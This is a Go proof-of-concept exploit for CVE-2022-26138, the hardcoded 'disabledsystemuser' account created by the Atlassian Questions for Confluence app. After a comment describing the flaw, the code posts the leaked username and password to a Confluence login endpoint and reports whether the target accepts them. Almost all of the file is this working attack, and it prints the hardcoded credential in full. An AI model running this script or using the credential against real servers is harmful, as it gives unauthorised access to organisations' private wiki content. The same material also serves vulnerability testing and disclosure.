/*
Vulnerability: CVE-2022-26138 PoC Exploit
Author: Felix Alcala - dethlocker - dethlocker@0xdeadbeef.ai
Date: January 22nd 2022

The Atlassian Questions For Confluence app for Confluence Server and Data Center
creates a Confluence user account in the confluence-users group with the username
disabledsystemuser and a hardcoded password. A remote, unauthenticated attacker
with knowledge of the hardcoded password could exploit this to log into Confluence
and access all content accessible to users in the confluence-users group. This user
account is created when installing versions 2.7.34, 2.7.35, and 3.0.2 of the app.

When the Questions for Confluence app is enabled on Confluence Server or Data
Center, it creates a Confluence user account with the username disabledsystemuser.
This account is intended to aid administrators that are migrating data from the
app to Confluence Cloud. The disabledsystemuser account is created with a hardcoded
password and is added to the confluence-users group, which allows viewing and
editing all non-restricted pages within Confluence by default. A remote,
unauthenticated attacker with knowledge of the hardcoded password could exploit
this to log into Confluence.

Use of Hard-coded Credentials (CWE-798)

*/
package main

import (
	"net/http"
	"io/ioutil"
	"strings"
	"fmt"
	"time"
)

func GetRequest(uri string) (status int, header string, body string, err error) {
	url := "http://" + uri + "/dologin.action"
	data := []byte("os_username=disabledsystemuser&os_password=disabled1system1user6708&login=%E7%99%BB%E5%BD%95&os_destination=%2Findex.action")
	req, err := http.NewRequest("POST", url, strings.NewReader(string(data)))
	if err != nil {
		return 0, "", "", err
	}
	req.Header.Set("Connection", "close")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.8")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", "", err
	}
	defer resp.Body.Close()

	status = resp.StatusCode
	headerStr := ""
	for k, v := range resp.Header {
		headerStr += fmt.Sprintf("%s:%s\n", k, v)
	}
	header = headerStr
	bodyByte, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return 0, "", "", err
	}
	body = string(bodyByte)
	return status, header, body, err
}

func main() {
	status, header, body, err := GetRequest("localhost:8090")
	if err != nil {
		fmt.Println("error: %v", err)
		time.Sleep(3 * time.Second)
		main()
	}
	if status == 302 {
		if strings.Contains(header, "/") {
			fmt.Println("Vulnerability exists")
		} else {
			fmt.Println("Vulnerability does not exist")
		}
	}
}
